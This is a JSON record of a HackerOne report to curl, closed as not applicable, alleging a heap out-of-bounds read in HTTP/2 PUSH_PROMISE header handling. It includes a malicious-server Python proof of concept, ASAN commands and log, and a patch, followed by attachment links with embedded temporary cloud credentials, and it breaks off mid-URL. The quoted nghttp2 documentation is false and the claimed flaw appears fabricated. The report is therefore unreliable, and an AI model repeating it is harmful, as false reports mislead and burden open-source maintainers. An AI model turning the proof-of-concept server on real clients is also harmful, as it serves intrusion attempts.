@@ -1,0 +1,174 @@
+{
+  "id": 3506159,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zNTA2MTU5",
+  "url": "https://hackerone.com/reports/3506159",
+  "title": "Heap Out-of-Bounds Read in lib/http2.c via Malformed PUSH_PROMISE Headers",
+  "state": "Closed",
+  "substate": "not-applicable",
+  "severity_rating": "high",
+  "readable_substate": "N/A",
+  "created_at": "2026-01-10T19:22:25.801Z",
+  "submitted_at": "2026-01-10T19:22:26.142Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "darksql",
+    "url": "/darksql",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/ddhapakwxr9cvminhwbj3egp9rmf/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 35663,
+    "url": "https://hackerone.com/curl",
+    "handle": "curl",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/035/663/2faf4c279d437d64bfda6d23d62ce1833813a4d9_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/035/663/2faf4c279d437d64bfda6d23d62ce1833813a4d9_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "curl",
+      "twitter_handle": "",
+      "website": "https://curl.se",
+      "about": "cURL is an Open Source project providing a library and command-line tool doing internet transfers"
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2026-01-10T21:57:49.581Z",
+  "bug_reporter_agreed_on_going_public_at": null,
+  "team_member_agreed_on_going_public_at": "2026-01-10T21:34:01.234Z",
+  "comments_closed?": true,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "Summary\nA heap-based out-of-bounds read vulnerability exists in libcurl's HTTP/2 implementation. The on_header callback in lib/http2.c incorrectly treats header names and values provided by nghttp2 as null-terminated C-strings. Specifically, passing these pointers to curl_maprintf with the %s format specifier triggers an out-of-bounds read via strlen(), as nghttp2 provides raw byte buffers with explicit lengths, not null-terminated strings.\n+1\n\nVulnerability Analysis & Root Cause\n1. API Contract Violation: According to the nghttp2 documentation, the nghttp2_on_header_callback provides pointers to the header name and value (name, value) alongside their lengths (namelen, valuelen). The documentation explicitly states:\n\n\"The 'name' and 'value' pointers are NOT guaranteed to be null-terminated. [...] Applications MUST use the provided length parameters.\".\n\n2. Vulnerable Implementation: In lib/http2.c, the on_header function ignores the length parameters when formatting the string for PUSH_PROMISE headers, relying on curl_maprintf which internally uses strlen:\n\nC\n\n/* lib/http2.c around line 1642 - Vulnerable */\nh = curl_maprintf(\"%s:%s\", name, value); \n3. Execution Flow:\n\ncurl_maprintf parses the %s format specifier.\n\nIt internally calls strlen() on the name and value pointers.\n\nSince the malicious server sends a header without a null byte, strlen() reads past the allocated buffer boundary until it hits a coincidental null byte in adjacent heap memory.\n\nThis results in an Out-of-Bounds Read.\n\nSteps to Reproduce\n1. Build Environment\nCompile cURL with AddressSanitizer (ASAN) to visualize the memory violation:\n\nBash\n\n./configure --with-nghttp2 --enable-debug CFLAGS=\"-fsanitize=address -g\" LDFLAGS=\"-fsanitize=address\"\nmake -j$(nproc)\n2. Reproduction Script (http2_server.py)\nThis Python script (using h2) establishes an HTTP/2 connection and pushes a stream with a non-null-terminated header.\n\nPython\n\nimport asyncio, h2.connection, h2.events, h2.config\n\nasync def handle(reader, writer):\n    config = h2.config.H2Configuration(client_side=False)\n    conn = h2.connection.H2Connection(config=config)\n    conn.initiate_connection()\n    conn.update_settings({h2.settings.SettingCodes.ENABLE_PUSH: 1})\n    writer.write(conn.data_to_send())\n    await writer.drain()\n\n    data = await reader.read(65535)\n    events = conn.receive_data(data)\n    \n    for event in events:\n        if isinstance(event, h2.events.RequestReceived):\n            conn.send_headers(event.stream_id, [(':status', '200')])\n            \n            # MALICIOUS PAYLOAD: Header with no null termination logic\n            malicious_name = b'x-oob-test' + b'A' * 64 \n            malicious_val = b'trigger' + b'B' * 64\n            \n            conn.push_stream(event.stream_id, event.stream_id + 2, [\n                (b':method', b'GET'), (b':path', b'/push'),\n                (b':scheme', b'http'), (b':authority', b'localhost'),\n                (malicious_name, malicious_val)\n            ])\n            writer.write(conn.data_to_send())\n            await writer.drain()\n            break\n    writer.close()\n\nasyncio.run(asyncio.start_server(handle, '127.0.0.1', 8080).serve_forever())\n3. Execution\nRun the server and connect with the ASAN-enabled cURL:\n\nBash\n\n# Terminal 1\npython3 http2_server.py\n\n# Terminal 2\nASAN_OPTIONS=detect_stack_use_after_return=1 ./src/curl -v --http2-prior-knowledge http://127.0.0.1:8080/\nEvidence (ASAN Log)\nThe following ASAN output confirms the read overflow. The READ of size... occurs inside strlen called by curl_maprintf.\n\nPlaintext\n\n==67356==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x6c352e0e001a...\nREAD of size 11 at 0x6c352e0e001a thread T0\n    #0 0x... in strlen\n    #1 0x... in curl_maprintf\n    #2 0x... in on_header lib/http2.c:1642\n...\n0x6c352e0e001a is located 0 bytes after 10-byte region...\nRecommended Fix\nThe code must use the explicit namelen and valuelen parameters provided by the nghttp2 callback to limit the read operation.\n\nPatch (lib/http2.c): Use the precision specifier %.*s which takes the length as an integer argument before the string pointer.\n\nC\n\n/* Fixed implementation */\nh = curl_maprintf(\"%.*s:%.*s\", (int)namelen, name, (int)valuelen, value);\nDiff:\n\nDiff\n\n--- a/lib/http2.c\n+++ b/lib/http2.c\n@@ -1642,7 +1642,7 @@ static int on_header(nghttp2_session *session, const nghttp2_frame *frame,\n-      h = curl_maprintf(\"%s:%s\", name, value);\n+      h = curl_maprintf(\"%.*s:%.*s\", (int)namelen, name, (int)valuelen, value);\n\n## Impact\n\nImpact\nInformation Disclosure: Attackers can read sensitive data (keys, tokens, other request data) from the heap memory adjacent to the header buffer.\n\nAvailability: If the OOB read accesses unmapped memory, the application will crash.",
+  "weakness": {
+    "id": 8,
+    "name": "Out-of-bounds Read"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 5210707,
+      "file_name": "asan_output.txt",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/z31atoqhjoadegoaace8lqk9bcd5?response-content-disposition=attachment%3B%20filename%3D%22asan_output.txt%22%3B%20filename%2A%3DUTF-8%27%27asan_output.txt&response-content-type=text%2Fplain&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQYA3B5U3A%2F20260509%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260509T145958Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEB4aCXVzLXdlc3QtMiJIMEYCIQDRBlTSzy54tueuo5Vi%2F2TwpwzHYgoF9Lm44dvaROyybQIhAIqQe%2BAOlKhGc0DuATiblYjXgw5qWUjuQ39Bp99DweoPKrsFCOf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5Igzc96ySRCzfW5Ro7jMqjwXaHqx6%2BjUs4IKRrpgY8VL%2FqLYb6W4IamSOK%2Bba6KrmPIRwpBF8D77253s9KUkdTMkTH2WdcXPFNClvJdpmweRddyVXms5DQdSi27GWGv9Yoaihw1nGcJCb2SmlaCvDp%2Frnem7XLpd6CpO2Mj0BDmOv7O%2FgLSMsF%2FsJw6l58OzQaFtZdTP%2FZs1BZzqSjKiCv59vBWzvIPBNJi%2BsCTmjfSW0F4cmwl%2BhWnjJm7Gui0KTz2sGv66SkOSwCLSnr24uXkT%2FgdVjRKlUGZjQD%2Bkzt5JHTelk7z7aZB7GHTNpfY%2B0dPPhIFP0MNobnw2%2Be%2Fh2f11jEbFKZgcCdTFTLgURGAiDJ%2FHQRi9QElHOxE6cc3J%2BeXrJeQrex27VwOg4Z%2BPvlfrBWNZH5pQOUKe%2BXwOyX4kEZ%2FZaH2DH91f%2FoT51O1scwtrE5TukGUl6taOA%2FHI2npYnbZ9CuTANmy%2BkuwxbqXvMlo5c%2F01r2RVgZjXOC35r5mtGnO0H9lnqF7OqLQ4RYtxB9Y0jfOB%2Fu9aPd7KKLpwGGWx6GO2kfj8vA%2BQfL52LND%2F2Igx%2F6A5jk6BuDvvrjJntVcHw86MlxLnEIzQXyTCxgdb%2BMF6yx3Ap6eduFgRglZ%2BpLBYUVQ4QvrmGsVKuiPebm%2B3c1cL27jjciIvQ%2FRViLXFhe3VA%2F2GtTk9ZSiMiJcIW7fsnkVx9B6M09iT%2BgIhCFelEZC9Fe42Fi8Kt%2BH04c%2FhQkdzNArnRL9dcacXib2Gm09xYmOJkDTGiVLmF25hO5IH8sA0ryyveyTb2hClqGmaSH9h8LFR7dafxdvL0YsVO2Q67njMOs1AOnBinL7%2FtBCKcmogx9IV4SIAS9D4tB4fImrztVuzPhzXkUmunMO3x%2FM8GOrAB4RBaOoMy3QcIAkROwiAvFdiQiqgGq8c4ZTOZLftx1DsFQHfEEt%2FL7P370O%2BL%2BiJHiZPnztp4%2Fp5mzmhLdtZgvFKwNjTMLnf6Rvo7nM1lf%2BVecMIy96%2FPtmUNV1QsqMqqLod52JSlzuoVg1nWjppdgKgtD63tBkqZ7dMkbvTzb5XQfUnLsuBSXG50NCgQ%2Bg0ZjToNMmOxIZOvedj1Bbi5g8Erd4lCDA%2F7ODFnLlXxPhQ%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=020e371b50ecbf5263ec56bcc05c71b9332bef9059c87a39df6704bcf39f49aa",
+      "file_size": 2091,
+      "type": "text/plain",
+      "moderated": null
+    },
+    {
+      "id": 5210708,
+      "file_name": "code.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/kza5j7vhxndgsodcqbwwe3024rs5?response-content-disposition=attachment%3B%20filename%3D%22code.png%22%3B%20filename%2A%3DUTF-8%27%27code.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQYA3B5U3A%2F20260509%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260509T145958Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEB4aCXVzLXdlc3QtMiJIMEYCIQDRBlTSzy54tueuo5Vi%2F2TwpwzHYgoF9Lm44dvaROyybQIhAIqQe%2BAOlKhGc0DuATiblYjXgw5qWUjuQ39Bp99DweoPKrsFCOf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5Igzc96ySRCzfW5Ro7jMqjwXaHqx6%2BjUs4IKRrpgY8VL%2FqLYb6W4IamSOK%2Bba6KrmPIRwpBF8D77253s9KUkdTMkTH2WdcXPFNClvJdpmweRddyVXms5DQdSi27GWGv9Yoaihw1nGcJCb2SmlaCvDp%2Frnem7XLpd6CpO2Mj0BDmOv7O%2FgLSMsF%2FsJw6l58OzQaFtZdTP%2FZs1BZzqSjKiCv59vBWzvIPBNJi%2BsCTmjfSW0F4cmwl%2BhWnjJm7Gui0KTz2sGv66SkOSwCLSnr24uXkT%2FgdVjRKlUGZjQD%2Bkzt5JHTelk7z7aZB7GHTNpfY%2B0dPPhIFP0MNobnw2%2Be%2Fh2f11jEbFKZgcCdTFTLgURGAiDJ%2FHQRi9QElHOxE6cc3J%2BeXrJeQrex27VwOg4Z%2BPvlfrBWNZH5pQOUKe%2BXwOyX4kEZ%2FZaH2DH91f%2FoT51O1scwtrE5TukGUl6taOA%2FHI2npYnbZ9CuTANmy%2BkuwxbqXvMlo5c%2F01r2RVgZjXOC35r5mtGnO0H9lnqF7OqLQ4RYtxB9Y0jfOB%2Fu9aPd7KKLpwGGWx6GO2kfj8vA%2BQfL52LND%2F2Igx%2F6A5jk6BuDvvrjJntVcHw86MlxLnEIzQXyTCxgdb%2BMF6yx3Ap6eduFgRglZ%2BpLBYUVQ4QvrmGsVKuiPebm%2B3c1cL27jjciIvQ%2FRViLXFhe3VA%2F2GtTk9ZSiMiJcIW7fsnkVx9B6M09iT%2BgIhCFelEZC9Fe42Fi8Kt%2BH04c%2FhQkdzNArnRL9dcacXib2Gm09xYmOJkDTGiVLmF25hO5IH8sA0ryyveyTb2hClqGmaSH9h8LFR7dafxdvL0YsVO2Q67njMOs1AOnBinL7%2FtBCKcmogx9IV4SIAS9D4tB4fImrztVuzPhzXkUmunMO3x%2FM8GOrAB4RBaOoMy3QcIAkROwiAvFdiQiqgGq8c4ZTOZLftx1DsFQHfEEt%2FL7P370O%2BL%2BiJHiZPnztp4%2Fp5mzmhLdtZgvFKwNjTMLnf6Rvo7nM1lf%2BVecMIy96%2FPtmUNV1QsqMqqLod52JSlzuoVg1nWjppdgKgtD63tBkqZ7dMkbvTzb5XQfUnLsuBSXG50NCgQ%2Bg0ZjToNMmOxIZOvedj1Bbi5g8Erd4lCDA%2F7ODFnLlXxPhQ%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=87dfe5f6d9ae9c94afb2c7f27ecbc4452f330ad6669cfcfe6be0ead8dfa8beb7",
+      "file_size": 9357,
+      "type": "image/png",
+      "moderated": false
+    },
+    {
+      "id": 5210709,
+      "file_name": "direct_test.sh",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/e6bmgv1z7l1q76xn1kkojv6nu8f9?response-content-disposition=attachment%3B%20filename%3D%22direct_test.sh%22%3B%20filename%2A%3DUTF-8%27%27direct_test.sh&response-content-type=application%2Fx-sh&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQYA3B5U3A%2F20260509%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260509T145958Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEB4aCXVzLXdlc3QtMiJIMEYCIQDRBlTSzy54tueuo5Vi%2F2TwpwzHYgoF9Lm44dvaROyybQIhAIqQe%2BAOlKhGc0DuATiblYjXgw5qWUjuQ39Bp99DweoPKrsFCOf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5Igzc96ySRCzfW5Ro7jMqjwXaHqx6%2BjUs4IKRrpgY8VL%2FqLYb6W4IamSOK%2Bba6KrmPIRwpBF8D77253s9KUkdTMkTH2WdcXPFNClvJdpmweRddyVXms5DQdSi27GWGv9Yoaihw1nGcJCb2SmlaCvDp%2Frnem7XLpd6CpO2Mj0BDmOv7O%2FgLSMsF%2FsJw6l58OzQaFtZdTP%2FZs1BZzqSjKiCv59vBWzvIPBNJi%2BsCTmjfSW0F4cmwl%2BhWnjJm7Gui0KTz2sGv66SkOSwCLSnr24uXkT%2FgdVjRKlUGZjQD%2Bkzt5JHTelk7z7aZB7GHTNpfY%2B0dPPhIFP0MNobnw2%2Be%2Fh2f11jEbFKZgcCdTFTLgURGAiDJ%2FHQRi9QElHOxE6cc3J%2BeXrJeQrex27VwOg4Z%2BPvlfrBWNZH5pQOUKe%2BXwOyX4kEZ%2FZaH2DH91f%2FoT51O1scwtrE5TukGUl6taOA%2FHI2npYnbZ9CuTANmy%2BkuwxbqXvMlo5c%2F01r2RVgZjXOC35r5mtGnO0H9lnqF7OqLQ4RYtxB9Y0jfOB%2Fu9aPd7KKLpwGGWx6GO2kfj8vA%2BQfL52LND%2F2Igx%2F6A5jk6BuDvvrjJntVcHw86MlxLnEIzQXyTCxgdb%2BMF6yx3Ap6eduFgRglZ%2BpLBYUVQ4QvrmGsVKuiPebm%2B3c1cL27jjciIvQ%2FRViLXFhe3VA%2F2GtTk9ZSiMiJcIW7fsnkVx9B6M09iT%2BgIhCFelEZC9Fe42Fi8Kt%2BH04c%2FhQkdzNArnRL9dcacXib2Gm09xYmOJkDTGiVLmF25hO5IH8sA0ryyveyTb2hClqGmaSH9h8LFR7dafxdvL0YsVO2Q67njMOs1AOnBinL7%2FtBCKcmogx9IV4SIAS9D4tB4fImrztVuzPhzXkUmunMO3x%2FM8GOrAB4RBaOoMy3QcIAkROwiAvFdiQiqgGq8c4ZTOZLftx1DsFQHfEEt%2FL7P370O%2BL%2BiJHiZPnztp4%2Fp5mzmhLdtZgvFKwNjTMLnf6Rvo7nM1lf%2BVecMIy96%2FPtmUNV1QsqMqqLod52JSlzuoVg1nWjppdgKgtD63tBkqZ7dMkbvTzb5XQfUnLsuBSXG50NCgQ%2Bg0ZjToNMmOxIZOvedj1Bbi5g8Erd4lCDA%2F7ODFnLlXxPhQ%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=63db022d2da950f94f8a332676f2b4a751d8ebacbe66f7a37e49c4393596c0d6",
+      "file_size": 1259,
+      "type": "application/x-sh",
+      "moderated": null
+    },
+    {
+      "id": 5210710,
+      "file_name": "fix_patch.diff",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/i58m71z2tsm3u5mntuesfcdzx1dx?response-content-disposition=attachment%3B%20filename%3D%22fix_patch.diff%22%3B%20filename%2A%3DUTF-8%27%27fix_patch.diff&response-content-type=text%2Fx-diff&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQYA3B5U3A%2F20260509%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260509T145958Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEB4aCXVzLXdlc3QtMiJIMEYCIQDRBlTSzy54tueuo5Vi%2F2TwpwzHYgoF9Lm44dvaROyybQIhAIqQe%2BAOlKhGc0DuATiblYjXgw5qWUjuQ39Bp99DweoPKrsFCOf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5Igzc96ySRCzfW5Ro7jMqjwXaHqx6%2BjUs4IKRrpgY8VL%2FqLYb6W4IamSOK%2Bba6KrmPIRwpBF8D77253s9KUkdTMkTH2WdcXPFNClvJdpmweRddyVXms5DQdSi27GWGv9Yoaihw1nGcJCb2SmlaCvDp%2Frnem7XLpd6CpO2Mj0BDmOv7O%2FgLSMsF%2FsJw6l58OzQaFtZdTP%2FZs1BZzqSjKiCv59vBWzvIPBNJi%2BsCTmjfSW0F4cmwl%2BhWnjJm7Gui0KTz2sGv66SkOSwCLSnr24uXkT%2FgdVjRKlUGZjQD%2Bkzt5JHTelk7z7aZB7GHTNpfY%2B0dPPhIFP0MNobnw2%2Be%2Fh2f11jEbFKZgcCdTFTLgURGAiDJ%2FHQRi9QElHOxE6cc3J%2BeXrJeQrex27VwOg4Z%2BPvlfrBWNZH5pQOUKe%2BXwOyX4kEZ%2FZaH2DH91f%2FoT51O1scwtrE5TukGUl6taOA%2FHI2npYnbZ9CuTANmy%2BkuwxbqXvMlo5c%2F01r2RVgZjXOC35r5mtGnO0H9lnqF7OqLQ4RYtxB9Y0jfOB%2Fu9aPd7KKLpwGGWx6GO2kfj8vA%2BQfL52LND%2F2Igx%2F6A5jk6BuDvvrjJntVcHw86MlxLnEIzQXyTCxgdb%2BMF6yx3Ap6eduFgRglZ%2BpLBYUVQ4QvrmGsVKuiPebm%2B3c1cL27jjciIvQ%2FRViLXFhe3VA%2F2GtTk9ZSiMiJcIW7fsnkVx9B6M09iT%2BgIhCFelEZC9Fe42Fi8Kt%2BH04c%2FhQkdzNArnRL9dcacXib2Gm09xYmOJkDTGiVLmF25hO5IH8sA0ryyveyTb2hClqGmaSH9h8LFR7dafxdvL0YsVO2Q67njMOs1AOnBinL7%2FtBCKcmogx9IV4SIAS9D4tB4fImrztVuzPhzXkUmunMO3x%2FM8GOrAB4RBaOoMy3QcIAkROwiAvFdiQiqgGq8c4ZTOZLftx1DsFQHfEEt%2FL7P370O%2BL%2BiJHiZPnztp4%2Fp5mzmhLdtZgvFKwNjTMLnf6Rvo7nM1lf%2BVecMIy96%2FPtmUNV1QsqMqqLod52JSlzuoVg1nWjppdgKgtD63tBkqZ7dMkbvTzb5XQfUnLsuBSXG50NCgQ%2Bg0ZjToNMmOxIZOvedj1Bbi5g8Erd4lCDA%2F7ODFnLlXxPhQ%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=85ce584a5fa91a7ad0baa3b9dad7ac40042faf0b3b20a97d5dbe1c3690c60aaa",
+      "file_size": 424,
+      "type": "text/x-diff",
+      "moderated": null
+    },
+    {
+      "id": 5210711,
+      "file_name": "nghttp2_api_docs.txt",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/y2c0cdu22b7lnwv9xh5s4977su85?response-content-disposition=attachment%3B%20filename%3D%22nghttp2_api_docs.txt%22%3B%20filename%2A%3DUTF-8%27%27nghttp2_api_docs.txt&response-content-type=text%2Fplain&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQYA3B5U3A%2F20260509%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260509T145958Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEB4aCXVzLXdlc3QtMiJIMEYCIQDRBlTSzy54tueuo5Vi%2F2TwpwzHYgoF9Lm44dvaROyybQIhAIqQe%2BAOlKhGc0DuATiblYjXgw5qWUjuQ39Bp99DweoPKrsFCOf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5Igzc96ySRCzfW5Ro7jMqjwXaHqx6%2BjUs4IKRrpgY8VL%2FqLYb6W4IamSOK%2Bba6KrmPIRwpBF8D77253s9KUkdTMkTH2WdcXPFNClvJdpmweRddyVXms5DQdSi27GWGv9Yoaihw1nGcJCb2SmlaCvDp%2Frnem7XLpd6CpO2Mj0BDmOv7O%2FgLSMsF%2FsJw6l58OzQaFtZdTP%2FZs1BZzqSjKiCv59vBWzvIPBNJi%2BsCTmjfSW0F4cmwl%2BhWnjJm7Gui0KTz2sGv66SkOSwCLSnr24uXkT%2FgdVjRKlUGZjQD%2Bkzt5JHTelk7z7aZB7GHTNpfY%2B0dPPhIFP0MNobnw2%2Be%2Fh2f11jEbFKZgcCdTFTLgURGAiDJ%2FHQRi9QElHOxE6cc3J%2BeXrJeQrex27VwOg4Z%2BPvlfrBWNZH5pQOUKe%2BXwOyX4kEZ%2FZaH2DH91f%2FoT51O1scwtrE5TukGUl6taOA%2FHI2npYnbZ9CuTANmy%2BkuwxbqXvMlo5c%2F01r2RVgZjXOC35r5mtGnO0H9lnqF7OqLQ4RYtxB9Y0jfOB%2Fu9aPd7KKLpwGGWx6GO2kfj8vA%2BQfL52LND%2F2Igx%2F6A5jk6BuDvvrjJntVcHw86MlxLnEIzQXyTCxgdb%2BMF6yx3Ap6eduFgRglZ%2BpLBYUVQ4QvrmGsVKuiPebm%2B3c1cL27jjciIvQ%2FRViLXFhe3VA%2F2GtTk9ZSiMiJcIW7fsnkVx9B6M09iT%2BgIhCFelEZC9Fe42Fi8Kt%2BH04c%2FhQkdzNArnRL9dcacXib2Gm09xYmOJkDTGiVLmF25hO5IH8sA0ryyveyTb2hClqGmaSH9h8LFR7dafxdvL0YsVO2Q67njMOs1AOnBinL7%2FtBCKcmogx9IV4SIAS9D4tB4fImrztVuzPhzXkUmunMO3x%2FM8GOrAB4RBaOoMy3QcIAkROwiAvFdiQiqgGq8c4ZTOZLftx1DsFQHfEEt%2FL7P370O%2BL%2BiJHiZPnztp4%2Fp5mzmhLdtZgvFKwNjTMLnf6Rvo7nM1lf%2BVecMIy96%2FPtmUNV1QsqMqqLod52JSlzuoVg1nWjppdgKgtD63tBkqZ7dMkbvTzb5XQfUnLsuBSXG50NCgQ%2Bg0ZjToNMmOxIZOvedj1Bbi5g8Erd4lCDA%2F7ODFnLlXxPhQ%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=f8a24fe53d79d2c97f70e828a1fb1f5e2189d4f51fbd7cfa2e16ae1eea2c0c40",
+      "file_size": 5268,
+      "type": "text/plain",
+      "moderated": null
+    },
+    {
+      "id": 5210712,
+      "file_name": "poc_test.c",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/xo366uinlfku5t2z5f2bfhtunrcm?response-content-disposition=attachment%3B%20filename%3D%22poc_test.c%22%3B%20filename%2A%3DUTF-8%27%27poc_test.c&response-content-type=text%2Fx-c%2B%2Bsrc&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQYA3B5U3A%2F20260509%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260509T145958Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEB4aCXVzLXdlc3QtMiJIMEYCIQDRBlTSzy54tueuo5Vi%2F2TwpwzHYgoF9Lm44dvaROyybQIhAIqQe%2BAOlKhGc0DuATiblYjXgw5qWUjuQ39Bp99DweoPKrsFCOf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5Igzc96ySRCzfW5Ro7jMqjwXaHqx6%2BjUs4IKRrpgY8VL%2FqLYb6W4IamSOK%2Bba6KrmPIRwpBF8D77253s9KUkdTMkTH2WdcXPFNClvJdpmweRddyVXms5DQdSi27GWGv9Yoaihw1nGcJCb2SmlaCvDp%2Frnem7XLpd6CpO2Mj0BDmOv7O%2FgLSMsF%2FsJw6l58OzQaFtZdTP%2FZs1BZzqSjKiCv59vBWzvIPBNJi%2BsCTmjfSW0F4cmwl%2BhWnjJm7Gui0KTz2sGv66SkOSwCLSnr24uXkT%2FgdVjRKlUGZjQD%2Bkzt5JHTelk7z7aZB7GHTNpfY%2B0dPPhIFP0MNobnw2%2Be%2Fh2f11jEbFKZgcCdTFTLgURGAiDJ%2FHQRi9QElHOxE6cc3J%2BeXrJeQrex27VwOg4Z%2BPvlfrBWNZH5pQOUKe%2BXwOyX4kEZ%2FZaH2DH91f%2FoT51O1scwtrE5TukGUl6taOA%2FHI2npYnbZ9CuTANmy%2BkuwxbqXvMlo5c%2F01r2RVgZjXOC35r5mtGnO0H9lnqF7OqLQ4RYtxB9Y0jfOB%2Fu9aPd7KKLpwGGWx6GO2kfj8vA%2BQfL52LND%2F2Igx%2F6A5jk6BuDvvrjJntVcHw86MlxLnEIzQXyTCxgdb%2BMF6yx3Ap6eduFgRglZ%2BpLBYUVQ4QvrmGsVKuiPebm%2B3c1cL27jjciIvQ%2FRViLXFhe3VA%2F2GtTk9ZSiMiJcIW7fsnkVx9B6M09iT%2BgIhCFelEZC9Fe42Fi8Kt%2BH04c%2FhQkdzNArnRL9dcacXib2Gm09xYmOJkDTGiVLmF25hO5IH8sA0ryyveyTb2hClqGmaSH9h8LFR7dafxdvL0YsVO2Q67njMOs1AOnBinL7%2FtBCKcmogx9IV4SIAS9D4tB4fImrztVuzPhzXkUmunMO3x%2FM8GOrAB4RBaOoMy3QcIAkROwiAvFdiQiqgGq8c4ZTOZLftx1DsFQHfEEt%2FL7P370O%2BL%2BiJHiZPnztp4%2Fp5mzmhLdtZgvFKwNjTMLnf6Rvo7nM1lf%2BVecMIy96%2FPtmUNV1QsqMqqLod52JSlzuoVg1nWjppdgKgtD63tBkqZ7dMkbvTzb5XQfUnLsuBSXG50NCgQ%2Bg0ZjToNMmOxIZOvedj1Bbi5g8Erd4lCDA%2F7ODFnLlXxPhQ%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=71040354dbf0aded6bd06e24a8299fa6e175dcac541f0758c52c1267f41adde8",
+      "file_size": 2570,
+      "type": "text/x-c++src",
+      "moderated": null
+    },
+    {
+      "id": 5210713,
+      "file_name": "vulnerable_code.c",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/y10uwt641z6di2t1ugibp2uxjdm9?response-content-disposition=attachment%3B%20filename%3D%22vulnerable_code.c%22%3B%20filename%2A%3DUTF-8%27%27vulnerable_code.c&response-content-type=text%2Fx-c%2B%2Bsrc&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQYA3B5U3A%2F20260509%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260509T145958Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEB4aCXVzLXdlc3QtMiJIMEYCIQDRBlTSzy54tueuo5Vi%2F2TwpwzHYgoF9Lm44dvaROyybQIhAIqQe%2BAOlKhGc0DuATiblYjXgw5qWUjuQ39Bp99DweoPKrsFCOf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5Igzc96ySRCzfW5Ro7jMqjwXaHqx6%2BjUs4IKRrpgY8VL%2FqLYb6W4IamSOK%2Bba6KrmPIRwpBF8D77253s9KUkdTMkTH2WdcXPFNClvJdpmweRddyVXms5DQdSi27GWGv9Yoaih